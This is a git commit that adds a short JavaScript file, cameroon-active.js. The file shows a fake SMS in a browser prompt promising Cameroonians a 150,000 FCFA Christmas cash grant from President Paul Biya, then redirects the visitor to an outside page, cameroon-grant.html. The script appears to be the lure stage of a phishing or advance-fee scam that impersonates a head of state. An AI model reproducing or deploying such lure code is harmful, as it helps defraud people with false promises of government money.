bffd38f10604010f53082a3dd9a0c40cc8a2e596
boss-bloq <nsisboy01@gmail.com>
2024-11-18 13:16:39 -0800

    Create cameroon-active.js

---
+++ cameroon-active.js
@@ -0,0 +1,6 @@
+
+var password = 'RETRAIT 150.000 FCFA'
+password=prompt('SMS : Félicitations, vous êtes éligible à la subvention de Noël en espèces de 150 000 FCFA du Président PAUL BIYA pour les CAMEROUNAIS. Veuillez appuyer sur OK pour retirer le prix en espèces.   ','RETRAIT 150.000 FCFA');
+if (password != 'RETRAIT 150.000 FCFA') {
+location.href='https://damba-fest.org/cameroon-grant.html';
+}
